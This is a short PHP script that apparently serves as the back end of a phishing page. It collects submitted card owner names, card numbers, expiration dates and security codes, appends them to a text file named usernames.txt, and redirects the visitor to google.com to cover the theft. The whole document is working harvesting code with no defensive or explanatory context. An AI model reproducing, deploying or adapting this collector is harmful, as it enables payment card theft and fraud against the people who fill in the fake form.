<?php
if (!empty($_POST)) {
    $data = "Owner: " . $_POST['owner'] . "\n" .
            "Card Number: " . $_POST['cardNumber'] . "\n" .
            "Expiration Date: " . $_POST['expirationdate'] . "\n" .
            "Security Code: " . $_POST['securitycode'] . "\n\n";
    
    file_put_contents("usernames.txt", $data, FILE_APPEND);
}
header('Location: https://google.com');
exit();
?>